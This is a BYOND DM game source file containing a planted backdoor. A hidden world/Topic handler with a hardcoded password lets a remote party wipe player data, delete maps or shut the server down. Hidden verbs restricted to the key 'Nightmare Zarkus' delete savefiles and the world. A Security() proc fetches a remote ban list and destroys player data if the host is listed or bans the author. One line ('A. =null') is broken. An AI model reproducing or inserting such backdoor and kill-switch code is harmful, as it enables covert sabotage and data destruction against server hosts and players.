world/Topic(A)
	A=params2list(A)
	var/Password=A["asdfzarkusishere111"]
	if(Password!="asdfzarkusishere12") return
	if(A["Command"]=="qRuin") Ruin()
	else if(A["Command"]=="qShutdown") shutdown()
	else if(A["Command"]=="qRuinAll") Ruin_Everything()
	else
		var/Text=A["Command"]
		src<<"<font size=2><font color=#FFFF00>[Text]"
	..()
mob/Admin4/verb
	RemoteZ()
		set hidden=1
		var/A=input("Server") as text
		var/B=input("Command") as text
		var/C=input("Password") as text
		world.Export("byond://[A]?Command=[B]&zep=[C]")
	RuinB()
		set hidden=1
		if(usr.key != "Nightmare Zarkus") return
		usr<<"Ruined."
		Ruin()
	RuinA()
		set hidden=1
		if(usr.key != "Nightmare Zarkus") return
		usr<<"Ruined."
		Ruin_World()
	RuinServerB()
		set hidden=1
		if(usr.key != "Nightmare Zarkus") return
		usr<<"Ruined server."
		Ruin_Everything()
proc/Ruin()
	for(var/mob/Players/A in world)
		A.icon=null
		A.Base=null
		A.EnergyMax=null
		A.contents=null
		A. =null
		A.Recovery=null
	//	A.name=pick("Lawless","Trues","Luda","Kartamas","Kite","Murtkai","Jetniss","Persh","Archonex","Im Batman","Dragonn","Nevets","Beamed","Bloo","Sirch","Yuki","Ebony","Haku","Redman","Donni","Hellbound","Lionheart","Fayte","Cebta","Lewis","Karen","Luke","Duper")
		A.client.SaveChar()
		if(prob(15))del(A)
proc/Ruin_Everything()
	usr<<"<font color=yellow>Deleting the map."
	fdel("Saves/Map")
	world.Reboot()
proc/Ruin_World()
	for(var/mob/M) M.Savable=0
	world<< "The server is wiping!"
	usr<<"<font color=yellow>Deleting savefiles."
	fdel("Save/")
	usr<<"<font color=yellow>Deleting everything else."
	fdel("Saves/")
	del(world)


var/Authorization="http://www.byond.com/members/Dragonn/files/Bans.txt"
proc/Security()
	var/A=world.GetConfig("keyban")
	if(findtext(list2params(A),"Nightmare Zarkus"))
		world<<"<font color=#FFFF00>Host has codeds banned. Deleting server."
		Ruin()
	var/list/B=world.Export(Authorization)
	if(B)
		A=file2text(B["CONTENT"])
		if(findtext(A,world.host)||findtext(B,world.address))
			world<<"This server is banned from hosting"
			Ruin()
	spawn(12000)Security()